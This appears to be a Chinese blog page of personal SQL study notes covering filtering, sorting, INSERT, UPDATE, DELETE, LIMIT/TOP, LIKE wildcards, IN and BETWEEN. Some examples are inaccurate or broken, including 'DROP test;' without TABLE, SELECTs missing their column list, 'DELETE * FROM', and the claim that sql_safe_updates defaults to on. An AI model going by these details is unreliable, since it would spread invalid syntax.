<p>如果第一个条件和第二个条件中只要有一个成立，则 OR 运算符显示一条记录。</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> country=<span class="string">'CN'</span> <span class="keyword">AND</span> alexa &gt; <span class="number">50</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Websites WHERE <span class="attribute">country</span>=<span class="string">'USA'</span> <span class="keyword">OR</span> <span class="attribute">country</span>=<span class="string">'CN'</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SELECT * <span class="keyword">FROM</span> Websites WHERE alexa &gt; 15 <span class="keyword">AND</span> (<span class="attribute">country</span>=<span class="string">'CN'</span> <span class="keyword">OR</span> <span class="attribute">country</span>=<span class="string">'USA'</span>);</span><br></pre></td></tr></table></figure>

<h4 id="SQL-ORDER-BY-关键字"><a href="#SQL-ORDER-BY-关键字" class="headerlink" title="SQL ORDER BY 关键字"></a>SQL ORDER BY 关键字</h4><p>ORDER BY 关键字用于对结果集按照一个列或者多个列进行排序。</p>
<p>ORDER BY 关键字默认按照升序对记录进行排序。如果需要按照降序对记录进行排序，您可以使用 DESC 关键字。</p>
<p>SQL ORDER BY 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name,column_name <span class="keyword">FROM</span> table_name <span class="keyword">ORDER</span> <span class="keyword">BY</span> column_name,column_name <span class="keyword">ASC</span>|<span class="keyword">DESC</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “alexa” 列排序：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">ORDER</span> <span class="keyword">BY</span> alexa;</span><br></pre></td></tr></table></figure>

<p>ORDER BY 多列</p>
<p>下面的 SQL 语句从 “Websites” 表中选取所有网站，并按照 “country” 和 “alexa” 列排序：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">ORDER</span> <span class="keyword">BY</span> country,alexa;</span><br></pre></td></tr></table></figure>

<p>ORDER BY 多列的时候，先按照第一个column name排序，在按照第二个column name排序；如上述教程最后一个例子：</p>
<ul>
<li>先将country值这一列排序，同为CN的排前面，同属USA的排后面；</li>
<li>然后在同属CN的这些多行数据中，再根据alexa值的大小排列。</li>
<li>ORDER BY 排列时，不写明ASC DESC的时候，默认是ASC。</li>
</ul>
<p>ORDER BY 多列的时候，eg:</p>
<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A,<span class="keyword">B </span>       这个时候都是默认按升序排列</span><br><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A desc,<span class="keyword">B </span>  这个时候 A 降序，<span class="keyword">B </span>升序排列</span><br><span class="line"><span class="keyword">order </span><span class="keyword">by </span>A ,<span class="keyword">B </span>desc  这个时候 A 升序，<span class="keyword">B </span>降序排列</span><br></pre></td></tr></table></figure>

<h4 id="SQL-INSERT-INTO-语句"><a href="#SQL-INSERT-INTO-语句" class="headerlink" title="SQL INSERT INTO 语句"></a>SQL INSERT INTO 语句</h4><p>INSERT INTO 语句用于向表中插入新记录。</p>
<p>SQL INSERT INTO 语法</p>
<p>INSERT INTO 语句可以有两种编写形式。</p>
<p>第一种形式无需指定要插入数据的列名，只需提供被插入的值即可：</p>
<p>INSERT INTO <em>table_name</em><br>VALUES (<em>value1</em>,<em>value2</em>,<em>value3</em>,…);</p>
<p>第二种形式需要指定列名及被插入的值：</p>
<p>INSERT INTO <em>table_name</em> (<em>column1</em>,<em>column2</em>,<em>column3</em>,…)<br>VALUES (<em>value1</em>,<em>value2</em>,<em>value3</em>,…);</p>
<p>INSERT INTO 实例</p>
<p>假设我们要向 “Websites” 表中插入一个新行。</p>
<p>我们可以使用下面的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> Websites (<span class="keyword">name</span>, <span class="keyword">url</span>, alexa, country) <span class="keyword">VALUES</span> (<span class="string">'百度'</span>,<span class="string">'https://www.baidu.com/'</span>,<span class="string">'4'</span>,<span class="string">'CN'</span>);</span><br></pre></td></tr></table></figure>

<p>在指定的列插入数据</p>
<p>我们也可以在指定的列插入数据。</p>
<p>下面的 SQL 语句将插入一个新行，但是只在 “name”、”url” 和 “country” 列插入数据（id 字段会自动更新）：</p>
<p>（alex值为0）</p>
<p>没有指定要插入数据的列名的形式需要列出插入行的每一列数据:</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> table_name</span><br><span class="line"><span class="keyword">VALUES</span> (value1,value2,value3,...);</span><br></pre></td></tr></table></figure>

<p>insert into select 和select into from 的区别（不是很懂，没有见过这么操作的，待解决）</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">insert</span> <span class="keyword">into</span> scorebak <span class="keyword">select</span> * <span class="keyword">from</span> socre <span class="keyword">where</span> neza=<span class="string">'neza'</span>   <span class="comment">--插入一行,要求表scorebak 必须存在</span></span><br><span class="line"><span class="keyword">select</span> *  <span class="keyword">into</span> scorebak <span class="keyword">from</span> score  <span class="keyword">where</span> neza=<span class="string">'neza'</span>  <span class="comment">--也是插入一行,要求表scorebak 不存在</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-UPDATE-语句"><a href="#SQL-UPDATE-语句" class="headerlink" title="SQL UPDATE 语句"></a>SQL UPDATE 语句</h4><p>UPDATE 语句用于更新表中已存在的记录。</p>
<p>SQL UPDATE 语法</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">UPDATE table_name</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">column1</span>=value1,column2=value2,...</span><br><span class="line">WHERE <span class="attribute">some_column</span>=some_value;</span><br></pre></td></tr></table></figure>

<p>SQL UPDATE 实例</p>
<p>假设我们要把 “菜鸟教程” 的 alexa 排名更新为 5000，country 改为 USA。</p>
<p>我们使用下面的 SQL 语句：</p>
<p>实例</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Websites  <span class="builtin-name">SET</span> <span class="attribute">alexa</span>=<span class="string">'5000'</span>, <span class="attribute">country</span>=<span class="string">'USA'</span>  WHERE <span class="attribute">name</span>=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure>

<p>Update 警告！</p>
<p>在更新记录时要格外小心！在上面的实例中，如果我们省略了 WHERE 子句，如下所示：</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">UPDATE Websites</span><br><span class="line"><span class="builtin-name">SET</span> <span class="attribute">alexa</span>=<span class="string">'5000'</span>, <span class="attribute">country</span>=<span class="string">'USA'</span></span><br></pre></td></tr></table></figure>

<p>执行以上代码会将 Websites 表中所有数据的 alexa 改为 5000，country 改为 USA。</p>
<p>执行没有 WHERE 子句的 UPDATE 要慎重，再慎重。</p>
<p>SQL DELETE 语句</p>
<p>DELETE 语句用于删除表中的行。</p>
<h4 id="SQL-DELETE-语法"><a href="#SQL-DELETE-语法" class="headerlink" title="SQL DELETE 语法"></a>SQL DELETE 语法</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> some_column=some_value;</span><br></pre></td></tr></table></figure>

<p>SQL DELETE 实例</p>
<p>假设我们要从 “Websites” 表中删除网站名为 “百度” 且国家为 CN 的网站 。</p>
<p>我们使用下面的 SQL 语句：</p>
<p>实例</p>
<p>DELETE FROM Websites WHERE name=’百度’ AND country=’CN’;</p>
<p>删除所有数据</p>
<p>您可以在不删除表的情况下，删除表中所有的行。这意味着表结构、属性、索引将保持不变：</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> table_name;</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line"><span class="keyword">DELETE</span> * <span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>SQL关于删除的三个语句：<strong>DROP</strong>、<strong>TRUNCATE</strong>、 <strong>DELETE</strong> 的区别。</p>
<p><strong>DROP:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>删除表test，并释放空间，将test删除的一干二净。</p>
<p><strong>TRUNCATE:</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">TRUNCATE</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>删除表test里的内容，并释放空间，但不删除表的定义，表的结构还在。</p>
<p><strong>DELETE:</strong></p>
<p>1、删除指定数据</p>
<p>删除表test中年龄等于30的且国家为US的数据</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DELETE <span class="keyword">FROM</span> test WHERE <span class="attribute">age</span>=30 <span class="keyword">AND</span> <span class="attribute">country</span>=<span class="string">'US'</span>;</span><br></pre></td></tr></table></figure>

<p>2、删除整个表</p>
<p>仅删除表test内的所有内容，保留表的定义，不释放空间。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">test</span> 或者 <span class="keyword">DELETE</span> <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br><span class="line"><span class="keyword">DELETE</span> * <span class="keyword">FROM</span> <span class="keyword">test</span> 或者 <span class="keyword">DELETE</span> * <span class="keyword">FROM</span> <span class="keyword">test</span>;</span><br></pre></td></tr></table></figure>

<p>mysql 中可以通过参数 sql_safe_updates 来限制 update/delete，防止全表更新或删除。</p>
<p>以下 3 种情况在采用此参数的情况下都不能正常进行操作：</p>
<ul>
<li>1: 没有加where条件的全表更新操作;</li>
<li>2: 加了 where 条件字段，但是 where 字段没有走索引的表更新;</li>
<li>3: 全表 delete 没有加 where 条件或者 where 条件没有走索引。</li>
</ul>
<p>这三种情况下都会抛出异常，无法执行。</p>
<p>下面是 sql_safe_updates 变量为 0 和 1 时的取值说明：</p>
<p>sql_safe_updates 有两个取值 0 和 1， 即 off 和 on。</p>
<p>sql_safe_updates = 1 (或 sql_safe_updates = on ) 时，不带 where 和 limit 条件的 update 和 delete 操作语句是无法执行的，即使是有 where 和 limit 条件但不带 key column 限制条件的 update 和 delete 也不能执行。</p>
<p>sql_safe_updates = 0 (或 sql_safe_updates = off ) 时，无 where 和 limit 条件的 update 和 delete 操作将会顺利执行。</p>
<p>很显然，在一般的 mysql 中此参数的默认值是 1。</p>
<p>在 sql_safe_updates = on 时，采取删除或更新全表时抛出的错误码为 1175。</p>
<h4 id="SQL-SELECT-TOP-LIMIT-ROWNUM-子句"><a href="#SQL-SELECT-TOP-LIMIT-ROWNUM-子句" class="headerlink" title="SQL SELECT TOP, LIMIT, ROWNUM 子句"></a>SQL SELECT TOP, LIMIT, ROWNUM 子句</h4><p>SELECT TOP 子句用于规定要返回的记录的数目。</p>
<p>SELECT TOP 子句对于拥有数千条记录的大型表来说，是非常有用的。</p>
<p><strong>注意:</strong>并非所有的数据库系统都支持 SELECT TOP 语句。 MySQL 支持 LIMIT 语句来选取指定的条数数据， Oracle 可以使用 ROWNUM 来选取。</p>
<p>SQL Server / MS Access 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="built_in">number</span>|<span class="keyword">percent</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name;</span><br></pre></td></tr></table></figure>

<p>MySQL 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="keyword">number</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span></span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">LIMIT</span> <span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>Oracle 语法</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;= <span class="built_in">number</span>;</span><br></pre></td></tr></table></figure>

<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> </span><br><span class="line"><span class="keyword">FROM</span> Persons</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">ROWNUM</span> &lt;=<span class="number">5</span>;</span><br></pre></td></tr></table></figure>

<p>MySQL SELECT LIMIT 实例</p>
<p>下面的 SQL 语句从 “Websites” 表中选取头两条记录：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">LIMIT</span> <span class="number">2</span>;</span><br></pre></td></tr></table></figure>

<p>SQL SELECT TOP PERCENT 实例</p>
<p>在 Microsoft SQL Server 中还可以使用百分比作为参数。</p>
<p>下面的 SQL 语句从 websites 表中选取前面百分之 50 的记录：</p>
<p>实例</p>
<p>以下操作在 Microsoft SQL Server 数据库中可执行。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> TOP <span class="number">50</span> <span class="keyword">PERCENT</span> * <span class="keyword">FROM</span> Websites;</span><br></pre></td></tr></table></figure>

<p>变相返回后 N 行:</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">--前5行</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">5</span> * <span class="keyword">from</span> <span class="keyword">table</span></span><br><span class="line"></span><br><span class="line"><span class="comment">--后5行</span></span><br><span class="line"><span class="keyword">select</span> top <span class="number">5</span> * <span class="keyword">from</span> <span class="keyword">table</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="keyword">id</span> <span class="keyword">desc</span>  <span class="comment">--desc 表示降序排列 asc 表示升序</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-LIKE-操作符"><a href="#SQL-LIKE-操作符" class="headerlink" title="SQL LIKE 操作符"></a>SQL LIKE 操作符</h4><p>LIKE 操作符用于在 WHERE 子句中搜索列中的指定模式。</p>
<h4 id="SQL-LIKE-语法"><a href="#SQL-LIKE-语法" class="headerlink" title="SQL LIKE 语法"></a>SQL LIKE 语法</h4><figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">LIKE</span> pattern;</span><br></pre></td></tr></table></figure>

<p>SQL LIKE 操作符实例</p>
<p>下面的 SQL 语句选取 name 以字母 “G” 开始的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'G%'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 包含模式 “oo” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'%oo%'</span>;</span><br></pre></td></tr></table></figure>

<p>通过使用 NOT 关键字，您可以选取不匹配模式的记录。</p>
<p>下面的 SQL 语句选取 name 不包含模式 “oo” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">NOT</span> <span class="keyword">LIKE</span> <span class="string">'%oo%'</span>;</span><br></pre></td></tr></table></figure>

<p>example:</p>
<p>‘%a’    //以a结尾的数据</p>
<p>‘a%’    //以a开头的数据</p>
<p>‘%a%’    //含有a的数据</p>
<p>‘<em>a</em>’    //三位且中间字母是a的</p>
<p>‘_a’    //两位且结尾字母是a的</p>
<p>‘a_’    //两位且开头字母是a的</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> username <span class="keyword">where</span> 用户名 <span class="keyword">like</span> <span class="string">'段_%'</span>    <span class="comment">-- 会查出来段煜 段鑫</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> username <span class="keyword">where</span> 用户名 <span class="keyword">like</span> <span class="string">'段\_%'</span> escape <span class="string">'\'   -- 通过 \转义,只能查出来 段_煜</span></span><br></pre></td></tr></table></figure>

<h4 id="SQL-通配符"><a href="#SQL-通配符" class="headerlink" title="SQL 通配符"></a>SQL 通配符</h4><p>在 SQL 中，通配符与 SQL LIKE 操作符一起使用。</p>
<p>SQL 通配符用于搜索表中的数据。</p>
<p>在 SQL 中，可使用以下通配符：</p>
<table>
<thead>
<tr>
<th align="left">通配符</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%</td>
<td align="left">替代 0 个或多个字符</td>
</tr>
<tr>
<td align="left">_</td>
<td align="left">替代一个字符</td>
</tr>
<tr>
<td align="left">[<em>charlist</em>]</td>
<td align="left">字符列中的任何单一字符</td>
</tr>
<tr>
<td align="left">[^<em>charlist</em>] 或 [!<em>charlist</em>]</td>
<td align="left">不在字符列中的任何单一字符</td>
</tr>
</tbody></table>
<p>使用 SQL % 通配符</p>
<p>下面的 SQL 语句选取 url 以字母 “https” 开始的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites <span class="keyword">WHERE</span> <span class="keyword">url</span> <span class="keyword">LIKE</span> <span class="string">'https%'</span>;</span><br></pre></td></tr></table></figure>

<p>使用 SQL _ 通配符</p>
<p>下面的 SQL 语句选取 name 以一个任意字符开始，然后是 “oogle” 的所有客户：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">LIKE</span> <span class="string">'_oogle'</span>;</span><br></pre></td></tr></table></figure>

<p>使用 SQL [charlist] 通配符</p>
<p>MySQL 中使用 <strong>REGEXP</strong> 或 <strong>NOT REGEXP</strong> 运算符 (或 RLIKE 和 NOT RLIKE) 来操作正则表达式。</p>
<p>下面的 SQL 语句选取 name 以 “G”、”F” 或 “s” 开始的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[GFs]'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 以 A 到 H 字母开头的网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[A-H]'</span>;</span><br></pre></td></tr></table></figure>

<p>下面的 SQL 语句选取 name 不以 A 到 H 字母开头的网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> REGEXP <span class="string">'^[^A-H]'</span>;</span><br></pre></td></tr></table></figure>

<p>LIKE命令都涉及到的通配符：</p>
<p>% 替代一个或多个字符</p>
<p>_ 仅替代一个字符</p>
<p>[charlist] 字符列中的任何单一字符</p>
<p>[^charlist]或者[!charlist] 不在字符列中的任何单一字符</p>
<p>MySQL 和 SQLite 会把 <strong>like ‘[xxx]yyy’</strong> 的中括号当成普通字符，而不是通配符。</p>
<p>比如：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> persons <span class="keyword">WHERE</span> City <span class="keyword">LIKE</span> <span class="string">'[b]eijing'</span></span><br></pre></td></tr></table></figure>

<p>将查出 <strong>city</strong> 为 <strong>[B]eijing</strong> 的行，而不是 <strong>city</strong> 为 <strong>beijing</strong> 的行。</p>
<p>MySQL 中要完成 <strong>[^charlist]</strong> 或 <strong>[!charlist]</strong> 通配符的查询效果，需要通过正则表达式来完成。</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> persons <span class="keyword">WHERE</span> City REGEXP <span class="string">'[b]eijing'</span></span><br></pre></td></tr></table></figure>

<p>SQLite不支持Regexp正则方法。</p>
<h4 id="SQL-IN-操作符"><a href="#SQL-IN-操作符" class="headerlink" title="SQL IN 操作符"></a>SQL IN 操作符</h4><p>SQL IN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">IN</span> (value1,value2,...);</span><br></pre></td></tr></table></figure>

<p>IN 操作符实例</p>
<p>下面的 SQL 语句选取 name 为 “Google” 或 “菜鸟教程” 的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> <span class="keyword">name</span> <span class="keyword">IN</span> (<span class="string">'Google'</span>,<span class="string">'菜鸟教程'</span>);</span><br></pre></td></tr></table></figure>

<p><strong>IN 与 = 的异同</strong></p>
<ul>
<li>相同点：均在WHERE中使用作为筛选条件之一、均是等于的含义</li>
<li>不同点：IN可以规定多个值，等于规定一个值</li>
</ul>
<p>in 与 = 的转换**</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Websites <span class="keyword">where</span> <span class="keyword">name</span> <span class="keyword">in</span> (<span class="string">'Google'</span>,<span class="string">'菜鸟教程'</span>);</span><br></pre></td></tr></table></figure>

<p>可以转换成 <strong>=</strong> 的表达：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> Websites <span class="keyword">where</span> <span class="keyword">name</span>=<span class="string">'Google'</span> <span class="keyword">or</span> <span class="keyword">name</span>=<span class="string">'菜鸟教程'</span>;</span><br></pre></td></tr></table></figure>

<h4 id="SQL-BETWEEN-操作符"><a href="#SQL-BETWEEN-操作符" class="headerlink" title="SQL BETWEEN 操作符"></a>SQL BETWEEN 操作符</h4><p>BETWEEN 操作符选取介于两个值之间的数据范围内的值。这些值可以是数值、文本或者日期。</p>
<p>SQL BETWEEN 语法</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> column_name(s)</span><br><span class="line"><span class="keyword">FROM</span> table_name</span><br><span class="line"><span class="keyword">WHERE</span> column_name <span class="keyword">BETWEEN</span> value1 <span class="keyword">AND</span> value2;</span><br></pre></td></tr></table></figure>

<p>BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 alexa 介于 1 和 20 之间的所有网站：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>NOT BETWEEN 操作符实例</p>
<p>如需显示不在上面实例范围内的网站，请使用 NOT BETWEEN：</p>
<p>实例</p>
<figure class="highlight n1ql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> alexa <span class="keyword">NOT</span> <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>;</span><br></pre></td></tr></table></figure>

<p>带有 IN 的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 alexa 介于 1 和 20 之间但 country 不为 USA 和 IND 的所有网站：</p>
<p>实例</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> Websites</span><br><span class="line"><span class="keyword">WHERE</span> (alexa <span class="keyword">BETWEEN</span> <span class="number">1</span> <span class="keyword">AND</span> <span class="number">20</span>)</span><br><span class="line"><span class="keyword">AND</span> country <span class="keyword">NOT</span> <span class="keyword">IN</span> (<span class="string">'USA'</span>, <span class="string">'IND'</span>);</span><br></pre></td></tr></table></figure>

<p>带有文本值的 BETWEEN 操作符实例</p>
<p>下面的 SQL 语句选取 name 以介于 ‘A’ 和 ‘H’ 之间字母<strong>开始</strong>的所有网站：</p>
